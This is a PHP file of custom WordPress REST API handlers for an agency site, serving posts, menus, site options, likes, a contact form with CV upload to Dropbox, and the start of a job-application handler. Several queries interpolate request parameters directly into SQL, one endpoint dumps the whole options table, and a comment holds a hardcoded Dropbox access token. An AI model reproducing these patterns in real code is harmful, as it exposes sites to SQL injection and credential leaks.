<?php
function mos_getweb_api_data_list($data) {
    global $wpdb;
	$output = [];
    $columns = $wpdb->get_col( $wpdb->prepare("SELECT DISTINCT meta_key FROM {$wpdb->prefix}postmeta"));
	$i = 0;
	$args = [
		'post_type' => $data->get_param('type'),
        'offset' => ($data->get_param('offset'))?$data->get_param('offset'):0,
        'order'   => 'DESC',
        'orderby' => 'date',
		'posts_per_page' => ($data->get_param('offset'))?
        (($data->get_param('count'))? $data->get_param('count'):10):
        (($data->get_param('count'))? $data->get_param('count'):-1)
	];
    if ($data->get_param('taxonomy')) {  
        if ($data->get_param('taxonomy') == 'year'){
           $args['year'] = date( 'Y' );
        } else if ($data->get_param('taxonomy') == 'month') {        
           $args['monthnum'] = date( 'n' );
        } else if ($data->get_param('taxonomy') == 'week') {        
           $args['w'] = date( 'W' );
        } else {
            $catSlice = explode('-',$data->get_param('taxonomy'));
            if ($catSlice && sizeof($catSlice)) {   
                $args['tax_query']['relation'] = 'OR';
                foreach($catSlice as $catID){                
                    $taxonomy = $wpdb->get_var( "SELECT taxonomy FROM {$wpdb->prefix}term_taxonomy WHERE term_id={$catID}" );
                    $args['tax_query'][$catID] = array(
                        'taxonomy' => $taxonomy,
                        'field' => 'term_id',
                        'terms' => $catID
                    );
                }
            }            
        }
    }
    $query = new WP_Query( $args );
    //return $query;
    if ( $query->have_posts() ) :
        while ( $query->have_posts() ) : $query->the_post();
            $output[$i]['id'] = get_the_ID();
            $output[$i]['title'] = get_the_title();
            $output[$i]['content'] = do_shortcode(wpautop(get_the_content()));
    
            $output[$i]['excerpt']['full'] = get_the_excerpt();
            $output[$i]['excerpt']['small'] = wp_trim_words( get_the_content(), 10, '' );
            $output[$i]['excerpt']['medium'] = wp_trim_words( get_the_content(), 25, '' );
            $output[$i]['excerpt']['large'] = wp_trim_words( get_the_content(), 50, '' );
    
            $output[$i]['slug'] = get_post_field( 'post_name', get_the_ID() );
            $output[$i]['date'] = get_the_date('Y-m-d H:m:i');
            $output[$i]['modified_date'] = get_the_modified_date('Y-m-d H:m:i');
    
            $output[$i]['author']['id'] = get_the_author_ID();
            $output[$i]['author']['name'] = get_the_author_meta('display_name',get_the_author_ID());
            $output[$i]['author']['slug'] = get_the_author_meta('user_login',get_the_author_ID());
                
            $output[$i]['featured_image']['thumbnail'] = get_the_post_thumbnail_url(get_the_ID(), 'thumbnail');
            $output[$i]['featured_image']['medium'] = get_the_post_thumbnail_url(get_the_ID(), 'medium');
            $output[$i]['featured_image']['large'] = get_the_post_thumbnail_url(get_the_ID(), 'large');
            $output[$i]['featured_image']['full'] = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
            $output[$i]['featured_image']['id'] = get_post_thumbnail_id(get_the_ID()); 
            $output[$i]['featured_image']['image_attributes'] = wp_get_attachment_image_src( get_post_thumbnail_id(get_the_ID()), 'full' );   
    
            $output[$i]['featured_image']['alt'] = get_post_meta($output[$i]['featured_image']['id'], '_wp_attachment_image_alt', TRUE);
            $output[$i]['featured_image']['title'] = get_the_title($output[$i]['featured_image']['id']);
            $output[$i]['featured_image']['image_alt'] = ($output[$i]['featured_image']['alt'])?$output[$i]['featured_image']['alt']:$output[$i]['featured_image']['title']; 
    
            $output[$i]['image'] = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
    
    
            $taxonomies = $wpdb->get_results("SELECT DISTINCT {$wpdb->prefix}term_taxonomy.taxonomy FROM {$wpdb->prefix}term_relationships LEFT JOIN {$wpdb->prefix}term_taxonomy ON {$wpdb->prefix}term_relationships.term_taxonomy_id = {$wpdb->prefix}term_taxonomy.term_taxonomy_id WHERE {$wpdb->prefix}term_relationships.object_id=" . get_the_ID());
        
            if (sizeof($taxonomies)) {
                foreach ($taxonomies as $taxonomy) {
                    $output[$i]['taxonomy'][$taxonomy->taxonomy] = get_the_terms( $post_id, $taxonomy->taxonomy );
                }
            }
    
    
            foreach ($columns as $col) {
                $output[$i]['meta'][$col] = get_post_meta(get_the_ID(),$col, true);
                    
                if ($output[$i]['meta']['_mosacademy_testimonial_company_logo_id']){
                    //$output['meta'][$col][$n]['image_alt'] .= 'Image Alt';
    //                $alt = get_post_meta($output['meta']['_mosacademy_testimonial_company_logo_id'], '_wp_attachment_image_alt', TRUE);
    //                $title = get_the_title($output['meta']['_mosacademy_testimonial_company_logo_id']);


                    $output[$i]['meta']['_mosacademy_testimonial_company_logo_attributes'] = wp_get_attachment_image_src( $output[$i]['meta']['_mosacademy_testimonial_company_logo_id'], 'full' );
                }
            }
    
            $i++;
        endwhile;
    else : 
        $output['status'] = 'Error';
    endif;
    wp_reset_postdata();
	return $output;
}
function mos_getweb_api_data_single( $id ) {    
    global $wpdb;
    //$post_id = $id['id'];
    
    $post_id = (!is_numeric($id['id']))?$wpdb->get_var("SELECT ID FROM {$wpdb->prefix}posts WHERE post_name='{$id['id']}'"):$id['id'];
	$output = [];
    $columns = $wpdb->get_col( $wpdb->prepare("SELECT DISTINCT meta_key FROM {$wpdb->prefix}postmeta WHERE post_id=" . $post_id));
    
    $taxonomies = $wpdb->get_results("SELECT DISTINCT {$wpdb->prefix}term_taxonomy.taxonomy FROM {$wpdb->prefix}term_relationships LEFT JOIN {$wpdb->prefix}term_taxonomy ON {$wpdb->prefix}term_relationships.term_taxonomy_id = {$wpdb->prefix}term_taxonomy.term_taxonomy_id WHERE {$wpdb->prefix}term_relationships.object_id=" . $post_id);
    
    
    
    //$id = SELECT ID FROM api_getweb_wp_posts WHERE post_name='hello-world'
    
    $post   = get_post( $post_id );
    if ($post){
        $output['id'] = $post_id;
        $output['title'] = $post->post_title;
        $output['content'] = do_shortcode(apply_filters('the_content',$post->post_content));
//        $output['excerpt'] = $post->post_excerpt;
        $output['excerpt'] = wp_trim_words( strip_tags(strip_shortcodes($post->post_excerpt)), 30, '' );
        
        $output['slug'] = $post->post_name;    
        $output['date'] = get_the_date('Y-m-d H:m:i', $post_id);
        $output['modified_date'] = get_the_modified_date('Y-m-d H:m:i', $post_id);

        $output['author']['id'] = $post->post_author;
        $output['author']['name'] = get_the_author_meta('display_name',$post->post_author);
        $output['author']['description'] = get_the_author_meta('description',$post->post_author);
        $output['author']['designation'] = get_the_author_meta('_mos_profile_designation',$post->post_author);
        $output['author']['linkedin'] = get_the_author_meta('_mos_profile_linkedin',$post->post_author);
        $output['author']['slug'] = get_the_author_meta('user_login',$post->post_author);
        $output['author']['image']['full'] = get_the_author_meta( '_mos_profile_image', $post->post_author );
        $output['author']['image']['22'] = aq_resize(get_the_author_meta( '_mos_profile_image', $post->post_author ), 22, 22, true);
        $output['author']['image']['47'] = aq_resize(get_the_author_meta( '_mos_profile_image', $post->post_author ), 47, 47, true);
        $output['author']['image']['100'] = aq_resize(get_the_author_meta( '_mos_profile_image', $post->post_author ), 100, 100, true);
        $output['author']['image']['150'] = aq_resize(get_the_author_meta( '_mos_profile_image', $post->post_author ), 150, 150, true);
        

        $output['featured_image']['thumbnail'] = get_the_post_thumbnail_url($post_id, 'thumbnail');
        $output['featured_image']['medium'] = get_the_post_thumbnail_url($post_id, 'medium');
        $output['featured_image']['large'] = get_the_post_thumbnail_url($post_id, 'large');
        $output['featured_image']['full'] = get_the_post_thumbnail_url($post_id, 'full');
        $output['featured_image']['id'] = get_post_thumbnail_id($post_id); 
        
        
        $output['featured_image']['image_attributes'] = wp_get_attachment_image_src( get_post_thumbnail_id($post_id), 'full' ); 
        
        $output['featured_image']['alt'] = get_post_meta($output['featured_image']['id'], '_wp_attachment_image_alt', TRUE);
        $output['featured_image']['title'] = get_the_title($output['featured_image']['id']);
        $output['featured_image']['image_alt'] = ($output['featured_image']['alt'])?$output['featured_image']['alt']:$output['featured_image']['title'];
        $output['image'] = get_the_post_thumbnail_url($post_id, 'full');
        
        
        if (sizeof($taxonomies)) {
            foreach ($taxonomies as $taxonomy) {
                $output['taxonomy'][$taxonomy->taxonomy] = get_the_terms( $post_id, $taxonomy->taxonomy );
            }
        }

        foreach ($columns as $col) {
            $output['meta'][$col] = get_post_meta($post_id,$col, true);
            
            if ($output['meta']['_mosacademy_page_banner_image_gallery']){
                //$output['meta']['_mosacademy_page_banner_image_gallery'] = "Found";
                $n = 0;
                foreach($output['meta']['_mosacademy_page_banner_image_gallery'] as $key=>$value){
                    $output['meta']['banner_image_gallery'][$n]['url'] = $value;                    
                    $output['meta']['banner_image_gallery_alt'] = get_post_meta($key, '_wp_attachment_image_alt', TRUE);
                    $output['meta']['banner_image_gallery_title'] = get_the_title($key);                    
                    $output['meta']['banner_image_gallery'][$n]['alt'] = ($output['meta']['banner_image_gallery_alt'])?$output['meta']['banner_image_gallery_alt']:$output['meta']['banner_image_gallery_title'];
                    
                    $output['meta']['banner_image_gallery'][$n]['image_attributes'] = wp_get_attachment_image_src( $key, 'full' );
                    
                    $n++;
                }
            }            
            if ($output['meta']['_mosacademy_page_banner_feature_image_id']){
                //$output['meta'][$col][$n]['image_alt'] .= 'Image Alt';
                $output['meta']['_mosacademy_page_banner_feature_image_alt'] = get_post_meta($output['meta']['_mosacademy_page_banner_feature_image_id'], '_wp_attachment_image_alt', TRUE);
                $output['meta']['_mosacademy_page_banner_feature_image_title'] = get_the_title($output['meta']['_mosacademy_page_banner_feature_image_id']);
                $output['meta']['image_alt'] = ($output['meta']['_mosacademy_page_banner_feature_image_alt'])?$output['meta']['_mosacademy_page_banner_feature_image_alt']:$output['meta']['_mosacademy_page_banner_feature_image_title'];
                
                $output['meta']['_mosacademy_page_banner_feature_image_attributes'] = wp_get_attachment_image_src( $output['meta']['_mosacademy_page_banner_feature_image_id'], 'full' );
            }         
            if ($output['meta']['_mosacademy_testimonial_company_logo_id']){
                //$output['meta'][$col][$n]['image_alt'] .= 'Image Alt';
//                $alt = get_post_meta($output['meta']['_mosacademy_testimonial_company_logo_id'], '_wp_attachment_image_alt', TRUE);
//                $title = get_the_title($output['meta']['_mosacademy_testimonial_company_logo_id']);
                
                
                $output['meta']['_mosacademy_testimonial_company_logo_attributes'] = wp_get_attachment_image_src( $output['meta']['_mosacademy_testimonial_company_logo_id'], 'full' );
            }
            if ($col == "_mosacademy_page_group_details_group") {
                $n = 0;
                foreach($output['meta'][$col] as $single) {
                    $output['meta'][$col][$n]['group_slug'] = $output['meta'][$col][$n]['group_id'] = $output['slug'].'-'.$n;
                    //$output['meta'][$col][$n]['group_slug'] .= ' x'.$output['meta'][$col][$n]['_mosacademy_page_group_sub_titles'][0];
                    if ($single['_mosacademy_page_group_sub_titles'][0]) {
                        $cslug = strtolower(trim(preg_replace('/[\s-]+/', '-', preg_replace('/[^A-Za-z0-9-]+/', '-', preg_replace('/[&]/', 'and', preg_replace('/[\']/', '', iconv('UTF-8', 'ASCII//TRANSLIT', $single['_mosacademy_page_group_sub_titles'][0]))))), '-'));
                        $output['meta'][$col][$n]['group_slug'] .= ' '. $output['slug'].'-'.$cslug.' '.$cslug;
                        
                    } 
                    if ($single['_mosacademy_page_group_freature_image_id']){
                        //$output['meta'][$col][$n]['image_alt'] .= 'Image Alt';
                        $output['meta'][$col][$n]['_mosacademy_page_group_freature_image_alt'] = get_post_meta($single['_mosacademy_page_group_freature_image_id'], '_wp_attachment_image_alt', TRUE);
                        $output['meta'][$col][$n]['_mosacademy_page_group_freature_image_title'] = get_the_title($single['_mosacademy_page_group_freature_image_id']);
                        $output['meta'][$col][$n]['image_alt'] = ($output['meta'][$col][$n]['_mosacademy_page_group_freature_image_alt'])?$output['meta'][$col][$n]['_mosacademy_page_group_freature_image_alt']:$output['meta'][$col][$n]['_mosacademy_page_group_freature_image_title'];
                        
                        $output['meta'][$col][$n]['_mosacademy_page_group_freature_image_attributes'] = wp_get_attachment_image_src( $single['_mosacademy_page_group_freature_image_id'], 'full' ); 
                    }
                    $n++;
                }
            }
        }
    } else {        
        $output['status'] = 'Error';
    }
    return $output;
}
function mos_getweb_api_data_categories ($data){
    //return $data->get_param('taxonomy');
    $output = [];
    $tags = explode('-',$data->get_param('tags'));
    $all_tags = mos_get_terms($data->get_param('taxonomy'));
//    $output['size'] = sizeof($tags);
//    $output['tags'] = $data->get_param('tags');
    
    if ($data->get_param('tags')){
        foreach($all_tags as $tag) {
            if (in_array($tag['term_id'], $tags)){
                $output[] = $tag;
            }

        }
    } else {
       return $all_tags;
    }
    return $output;
    //return mos_get_terms($data->get_param('taxonomy'));
}
function mos_getweb_api_options (){
    global $mosacademy_options;
    if ($mosacademy_options["sections-footer-gallery"]) {
        $slice = explode(',',$mosacademy_options["sections-footer-gallery"]);
        $mosacademy_options["sections-footer-gallery"] = [];
        foreach($slice as $attachment_id){
            $mosacademy_options["sections-footer-gallery"][$attachment_id]['url'] = wp_get_attachment_url( $attachment_id );
            $mosacademy_options["sections-footer-gallery"][$attachment_id]['image_attributes'] = wp_get_attachment_image_src( $attachment_id, 'full' );
        }
    }
    if ($mosacademy_options["sections-footer-copyright-image"]) {
        $mosacademy_options["sections-footer-copyright-image-attributes"] = wp_get_attachment_image_src( $mosacademy_options["sections-footer-copyright-image"]["id"], 'full' );        
    }
    $mosacademy_options['site_title'] = get_bloginfo('name');
    $mosacademy_options['site_description'] = get_bloginfo('description');
    return $mosacademy_options;
}
function mos_getweb_api_menus (){
    global $wpdb;
    $output = [];
    
    $term_taxonomies = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}term_taxonomy WHERE taxonomy = 'nav_menu'", ARRAY_A );
    foreach($term_taxonomies as $row){
        $output[$row['term_id']] = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}terms WHERE term_id={$row['term_id']}", ARRAY_A ); 
        /*foreach($terms as $term) {            
            //$output[$term['term_id']]['name'] = $term['name'];    
            $output[$term['term_id']] = wp_get_nav_menu_items($term['name']);
        }*/
    }
    return $output;
}
function mos_getweb_api_menu($data) {
    //$current_menu='12';
    //$current_menu='Primary Menu';
    $menu_array = wp_get_nav_menu_items($data->get_param('id'));
    $menu = array();
    $x = 0;
    foreach ($menu_array as $m) {
        if (empty($m->menu_item_parent)) {
            $menu[$x] = array();
            $menu[$x]['ID'] = $m->ID;
            $menu[$x]['title'] = $m->title;
            $menu[$x]['class'] = get_post_meta($m->ID,'_menu_item_classes', true);
            $menu[$x]['url'] = $m->url;
            $menu[$x]['image'] = wp_get_attachment_url(get_post_meta($m->ID, '_thumbnail_id', true));
            $menu[$x]['hover_image'] = wp_get_attachment_url(get_post_meta($m->ID, '_thumbnail_hover_id', true));            
            $menu[$x]['submenu'] = populate_children($menu_array, $m);
        }
        $x++;
    }

    return $menu;

}
function populate_children($menu_array, $menu_item){
    $children = array();
    if (!empty($menu_array)){
        $y = 0;
        foreach ($menu_array as $k=>$m) {
            if ($m->menu_item_parent == $menu_item->ID) {
                $children[$y] = array();
                $children[$y]['ID'] = $m->ID;
                $children[$y]['title'] = $m->title;
                $children[$y]['class'] = get_post_meta($m->ID,'_menu_item_classes', true);
                $children[$y]['url'] = $m->url;
                $children[$y]['image'] = wp_get_attachment_url(get_post_meta($m->ID, '_thumbnail_id', true));
                $children[$y]['hover_image'] = wp_get_attachment_url(get_post_meta($m->ID, '_thumbnail_hover_id', true));
                unset($menu_array[$k]);
                $children[$y]['submenu'] = populate_children($menu_array, $m);   
            }
            $y++;
        }
    };
    return $children;
}
function mos_getweb_api_no_of_posts ($data){ 
    global $wpdb;   
	$args = [
		'post_type' => $data->get_param('type'),
        'offset' => ($data->get_param('offset'))?$data->get_param('offset'):0,
		'posts_per_page' => -1
	];
    if ($data->get_param('taxonomy')) {        
        
        if ($data->get_param('taxonomy') == 'year'){
           $args['year'] = date( 'Y' );
        } else if ($data->get_param('taxonomy') == 'month') {        
           $args['monthnum'] = date( 'n' );
        } else if ($data->get_param('taxonomy') == 'week') {        
           $args['w'] = date( 'W' );
        } else {
            $catSlice = explode('-',$data->get_param('taxonomy'));
            if ($catSlice && sizeof($catSlice)) {   
                $args['tax_query']['relation'] = 'OR';
                foreach($catSlice as $catID){                
                    $taxonomy = $wpdb->get_var( "SELECT taxonomy FROM {$wpdb->prefix}term_taxonomy WHERE term_id={$catID}" );
                    $args['tax_query'][$catID] = array(
                        'taxonomy' => $taxonomy,
                        'field' => 'term_id',
                        'terms' => $catID
                    );
                }
            }            
        }
    }
    $query = new WP_Query( $args );
    return $query->post_count;
}
//var_dump(get_post_meta(198, '_mosacademy_project_like', true));
function mos_getweb_api_like($data){
    global $wpdb;
    $response = [];
    $output = []; 
    $mosacademy_project_like = [];
    
    $like_count = $wpdb->get_var( "SELECT COUNT(*) FROM {$wpdb->prefix}postmeta WHERE post_id={$data->get_param('id')} AND meta_key='_mosacademy_project_like' AND meta_value LIKE '%{$data->get_param('ip')}%'" );
    

    
	if (!$like_count) {
        
        $row = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}postmeta WHERE post_id = {$data->get_param('id')} AND meta_key = '_mosacademy_project_like'" ); 
        
        $database['like_list_raw'] = $row->meta_value;
        $database['like_list_unserialize'] =  maybe_unserialize($database['like_list_raw']);
        $size = sizeof($database['like_list_unserialize']);
        $database['like_list_unserialize'][] =  $data->get_param('ip');    
        $database['like_list_serialize'] =  maybe_serialize($database['like_list_unserialize']);
        
        if (!$size) {
            $wpdb->insert( 
                $wpdb->prefix."postmeta", 
                array( 
                    'post_id' => $data->get_param('id'),
                    'meta_key' => '_mosacademy_project_like',
                    'meta_value' => $database['like_list_serialize']
                )
            );
        } else {
            $wpdb->update( 
                $wpdb->prefix."postmeta", 
                array( 
                    'meta_value' => $database['like_list_serialize']
                ), 
                array( 
                    'meta_id'   => $row->meta_id,
                )
            );            
        }

        
        $response['message'] = 'Like added';
    }
    else $response['message'] = 'You have already liked';
    
    $response['id'] = $data->get_param('id');
    $response['ip'] = $data->get_param('ip');  
    
    $output = new WP_REST_Response($response);
    $output->set_status(200);
    return ['req' => $output];
}
function mos_getweb_blog_page_data(){   
    global $wpdb; 
    $i = 0;
    $response = [];
    $output =[];
    $innervar = [];
	$args = [
		'post_type' => 'post',
        'order'   => 'DESC',
        'orderby' => 'date',
		'posts_per_page' => -1
	];
    $query = new WP_Query( $args );
    $response['count'] = $query->post_count;
    if ( $query->have_posts() ) :
        while ( $query->have_posts() ) : $query->the_post();$output[$i]['id'] = get_the_ID();
            $response['blogs'][$i]['title'] = get_the_title();    
            $response['blogs'][$i]['excerpt']['medium'] = wp_trim_words( get_the_content(), 25, '' );
    
            $response['blogs'][$i]['slug'] = get_post_field( 'post_name', get_the_ID() );
    
            $response['blogs'][$i]['featured_image']['medium'] = get_the_post_thumbnail_url(get_the_ID(), 'medium');
            $innervar[$i]['featured_image']['id'] = get_post_thumbnail_id(get_the_ID());    
    
            $innervar[$i]['featured_image']['alt'] = get_post_meta($innervar[$i]['featured_image']['id'], '_wp_attachment_image_alt', TRUE);
            $innervar[$i]['featured_image']['title'] = get_the_title($innervar[$i]['featured_image']['id']);
            $response['blogs'][$i]['featured_image']['image_alt'] = ($innervar[$i]['featured_image']['alt'])?$innervar[$i]['featured_image']['alt']:$innervar[$i]['featured_image']['title']; 
            
            $response['blogs'][$i]['date'] = get_the_date('Y-m-d H:m:i');            
            $taxonomies = $wpdb->get_results("SELECT DISTINCT {$wpdb->prefix}term_taxonomy.taxonomy FROM {$wpdb->prefix}term_relationships LEFT JOIN {$wpdb->prefix}term_taxonomy ON {$wpdb->prefix}term_relationships.term_taxonomy_id = {$wpdb->prefix}term_taxonomy.term_taxonomy_id WHERE {$wpdb->prefix}term_relationships.object_id=" . get_the_ID());
        
            if (sizeof($taxonomies)) {
                foreach ($taxonomies as $taxonomy) {
                    $response['blogs'][$i]['taxonomy'][$taxonomy->taxonomy] = get_the_terms( $post_id, $taxonomy->taxonomy );
                }
            }
            
            $i++;
        endwhile;
    else : 
        $output['status'] = 'Error';
    endif;
    wp_reset_postdata();
    $output = new WP_REST_Response($response);
    $output->set_status(200);
    return ['req' => $output];
}
/************************************************************************************************/
function mos_getweb_api_page_list (){
    return get_pages();
}
function mos_getweb_api_settings (){
    global $wpdb;
    $n = 0;
    $response = [];
    $output = [];     
    $results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}options" );
    
    foreach ( $results as $row ) {
        //$response[$n]['option_name'] = $row->option_name;
        $response[$row->option_name] = $row->option_value;
        //$n++;
    }
    
    $output = new WP_REST_Response($response);
    $output->set_status(200);
    return ['req' => $output];
}
function mos_getweb_api_posts() {
	$args = [
		'numberposts' => 99999,
		'post_type' => 'post'
	];

	$posts = get_posts($args);

	$output = [];
	$i = 0;

	foreach($posts as $post) {
		$output[$i]['id'] = $post->ID;
		$output[$i]['title'] = $post->post_title;
		$output[$i]['content'] = $post->post_content;
		$output[$i]['slug'] = $post->post_name;
		$output[$i]['featured_image']['thumbnail'] = get_the_post_thumbnail_url($post->ID, 'thumbnail');
		$output[$i]['featured_image']['medium'] = get_the_post_thumbnail_url($post->ID, 'medium');
		$output[$i]['featured_image']['large'] = get_the_post_thumbnail_url($post->ID, 'large');
		$i++;
	}

	return $output;
}
function mos_getweb_api_post( $id ) {
	$post   = get_post( $id['id'] );
	$output['id'] = $post->ID;
	$output['title'] = $post->post_title;
	$output['content'] = $post->post_content;
	$output['slug'] = $post->post_name;
	$output['featured_image']['thumbnail'] = get_the_post_thumbnail_url($post->ID, 'thumbnail');
	$output['featured_image']['medium'] = get_the_post_thumbnail_url($post->ID, 'medium');
	$output['featured_image']['large'] = get_the_post_thumbnail_url($post->ID, 'large');
    
    $output['meta']['page_group_details_group'] = get_post_meta($post->ID,'_mosacademy_page_group_details_group', true);
	return $output;
}
function mos_getweb_api_search($req) {  
    global $wpdb;
    $week = date( 'W' );
    $month = date( 'n' );
    $i = 0;
	$args = [
		's' => $req->get_param('s'),
        'post_type' => 'post',
        'posts_per_page' => -1,
        //'offset' => ($req->get_param('offset'))?$req->get_param('offset'):0
	];  
    $query = new WP_Query( $args );
    if ( $query->have_posts() ) :
        while ( $query->have_posts() ) : $query->the_post();
            $output[$i]['id'] = get_the_ID();
            $output[$i]['title'] = get_the_title();
            $output[$i]['content'] = get_the_content();
    
            $output[$i]['excerpt']['full'] = get_the_excerpt();
            $output[$i]['excerpt']['small'] = wp_trim_words( get_the_content(), 10, '' );
            $output[$i]['excerpt']['medium'] = wp_trim_words( get_the_content(), 30, '' );
            $output[$i]['excerpt']['large'] = wp_trim_words( get_the_content(), 50, '' );
    
            $output[$i]['slug'] = get_post_field( 'post_name', get_the_ID() );
            $output[$i]['date'] = get_the_date('Y-m-d H:m:i');
            $output[$i]['modified_date'] = get_the_modified_date('Y-m-d H:m:i');
    
            $output[$i]['author']['id'] = get_the_author_ID();
            $output[$i]['author']['name'] = get_the_author_meta('display_name',get_the_author_ID());
            $output[$i]['author']['slug'] = get_the_author_meta('user_login',get_the_author_ID());
                
            $output[$i]['featured_image']['thumbnail'] = get_the_post_thumbnail_url(get_the_ID(), 'thumbnail');
            $output[$i]['featured_image']['medium'] = get_the_post_thumbnail_url(get_the_ID(), 'medium');
            $output[$i]['featured_image']['large'] = get_the_post_thumbnail_url(get_the_ID(), 'large');
            $output[$i]['featured_image']['full'] = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
            $output[$i]['featured_image']['id'] = get_post_thumbnail_id(get_the_ID());     
            $output[$i]['image'] = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
    
    
            $taxonomies = $wpdb->get_results("SELECT DISTINCT {$wpdb->prefix}term_taxonomy.taxonomy FROM {$wpdb->prefix}term_relationships LEFT JOIN {$wpdb->prefix}term_taxonomy ON {$wpdb->prefix}term_relationships.term_taxonomy_id = {$wpdb->prefix}term_taxonomy.term_taxonomy_id WHERE {$wpdb->prefix}term_relationships.object_id=" . get_the_ID());
        
            if (sizeof($taxonomies)) {
                foreach ($taxonomies as $taxonomy) {
                    $output[$i]['taxonomy'][$taxonomy->taxonomy] = get_the_terms( $post_id, $taxonomy->taxonomy );
                }
            }
    
            foreach ($columns as $col) {
                $output[$i]['meta'][$col] = get_post_meta(get_the_ID(),$col, true);
            }
    
            $i++;
        endwhile;
    else : 
        $output['status'] = 'Error';
    endif;
    wp_reset_postdata();
    //$output['s'] = $req->get_param('s');
	return $output;
    /*
    $response['s'] = $req->get_param('s');
    
    $response['status'] = false;
    

    $output = new WP_REST_Response($response);
    $output->set_status(200);

    return ['req' => $output];*/
}
function mos_getweb_api_contact_form_save($req) {
    global $wpdb;    
    $parameters = $req->get_params();
    
    $response['name'] = $req->get_param('name');
    $response['email'] = $req->get_param('email');
    $response['code'] = $req->get_param('code');
    $response['phone'] = $req->get_param('phone');
    $response['interested'] = $req->get_param('interested');
    $response['budget'] = $req->get_param('budget');
    $response['company'] = $req->get_param('company');
    $response['source'] = $req->get_param('source');
    $response['message'] = $req->get_param('message');
    
    $response['cv'] = $_FILES['cv'];
    $response['error'] = [];
    $response['status'] = false;
    
    if (empty($req->get_param('name'))) {
        $response['error']['name'] = "Name is required";
    } else {
        $response['name'] = test_input($req->get_param('name'));
        if (!preg_match("/^[a-zA-Z-_'. ]*$/",$response['name'])) {///^[A-Za-z .]+$/
            $response['error']['name'] = "Only letters and white space allowed";
        }
    }
    if (empty($req->get_param('email'))) {
        $response['error']['email'] = "Email is required";
    } else {
        $response['email'] = test_input($req->get_param('email'));
        // check if e-mail address is well-formed
        if (!filter_var($response['email'], FILTER_VALIDATE_EMAIL)) {
            $response['error']['email'] = "Invalid email format";
        }
    }
    
//    $to = 'mostak.shahid@gmail.com';
//    $subject = 'The subject';
//    $body = 'The email body content';
//    $headers = array('Content-Type: text/html; charset=UTF-8');
//    wp_mail( $to, $subject, $body, $headers );      
    
    
    //*******************************************************************************************
    if(@$_FILES['cv']){
        $file_name = $_FILES['cv']['name'];
        $file_temp = $_FILES['cv']['tmp_name'];

        $upload_dir = wp_upload_dir();
        $image_data = file_get_contents( $file_temp );
        $filename = basename( $file_name );
        $filetype = wp_check_filetype($file_name);
        $fileext = strtolower($filetype['ext']);
        $filename = time().'.'.$fileext;
        
        // Check file size 1024000 = 1MB
        if ($_FILES["cv"]["size"] > 1024000 * 10) {
            $response['error']['file'] = "Sorry, your file is too large.";
        }
        
        $allowed = array('gif', 'png', 'jpg', 'jpeg', 'pdf', 'doc', 'docx');
        $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
        if (!in_array($ext, $allowed)) {
            $response['error']['file'] = "Please provide a valid file formate.";
        }
        
        if (!sizeof($response['error'])){
            /*if ( wp_mkdir_p( $upload_dir['path'] ) ) {
                $file = $upload_dir['path'] . '/' . $filename;
            }
            else {
                $file = $upload_dir['basedir'] . '/' . $filename;
            }
            file_put_contents( $file, $image_data );
            $wp_filetype = wp_check_filetype( $filename, null );
            $attachment = array(
                'post_mime_type' => $wp_filetype['type'],
                'post_title' => sanitize_file_name( $filename ),
                'post_content' => '',
                'post_status' => 'inherit'
            );
            $attachment_id = wp_insert_attachment( $attachment, $file );
            require_once(ABSPATH . "wp-admin" . '/includes/image.php');
            require_once(ABSPATH . "wp-admin" . '/includes/file.php');
            require_once(ABSPATH . "wp-admin" . '/includes/media.php');
            $attach_data = wp_generate_attachment_metadata( $attach_id, $file );
            wp_update_attachment_metadata( $attach_id, $attach_data );

            $response['attachment_id'] = $attachment_id;
            $response['attachment_url'] = wp_get_attachment_url( $attachment_id );*/
            
            /*$dropbox_folder = 'https://www.dropbox.com/home/Apps/Mos%20Academy/getweb';
            $path_parts = pathinfo($_FILES["cv"]["name"]);
            $file_path = time().rand(1000,9999).'.'.$path_parts['extension'];

            $path = $_FILES["cv"]["tmp_name"];
            $fp = fopen($path, 'rb');
            $size = filesize($path);

            $token = 'sl.BQoUNuwhUZBlvtlZYf0Aafbak8JwtqXZ6MNOv0-77bkg89lDh3bFtqhPjywbSPdJ8KkZXVbGDQnp-9ylBU6jPOMpMRLe0CXpRJl5k-Yu1CpsB433AmNa31D40LwSREFQ7K8Tnnbxy773';
            $cheaders = array('Authorization: Bearer ' . $token,
                          'Content-Type: application/octet-stream',
                          //'Dropbox-API-Arg: {"path":"/getweb/'.$path.'", "mode":"add"}');
                          'Dropbox-API-Arg: {"path":"/getweb/'.$file_path.'", "mode":"add"}');

            $ch = curl_init('https://content.dropboxapi.com/2/files/upload');
            curl_setopt($ch, CURLOPT_HTTPHEADER, $cheaders);
            curl_setopt($ch, CURLOPT_PUT, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_INFILE, $fp);
            curl_setopt($ch, CURLOPT_INFILESIZE, $size);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            //$response = curl_exec($ch);

            //echo $response;
            $response['dropbox'] = curl_exec($ch);
            curl_close($ch);
            fclose($fp);
            $response['attachment_url'] = $dropbox_folder.'?preview='.$file_path;*/
            $dropbox = mos_getweb_dropbox_func($_FILES);
            $response['attachment_url'] = $dropbox['attachment_url'];
        }
    }
    //*******************************************************************************************   
    
    if (!sizeof($response['error'])){
        $table_name = $wpdb->prefix.'contact_data';
        $wpdb->insert( 
            $table_name, 
            array( 
                'source' => $req->get_param('source')?$req->get_param('source'):'contact-form', 
                'view' => 0, 
                'time' => date('Y-m-d H:i:s'), 
                //'data' => json_encode($parameters), 
                'data' => json_encode($response), 
            )
        );    
        $response['status'] = true;
    }
    

    $output = new WP_REST_Response($response);
    $output->set_status(200);

    return ['req' => $output];
}
function mos_getweb_api_job_apply($req) {
    global $wpdb;
    
//    $to = 'mostak.shahid@gmail.com';
//    $subject = 'The subject';
//    $body = 'The email body content';
//    $headers = array('Content-Type: text/html; charset=UTF-8');
//    wp_mail( $to, $subject, $body, $headers );  
    
    
    $job_id = $wpdb->get_var( "SELECT ID FROM {$wpdb->prefix}posts WHERE post_name='{$req->get_param('job_id')}'" );
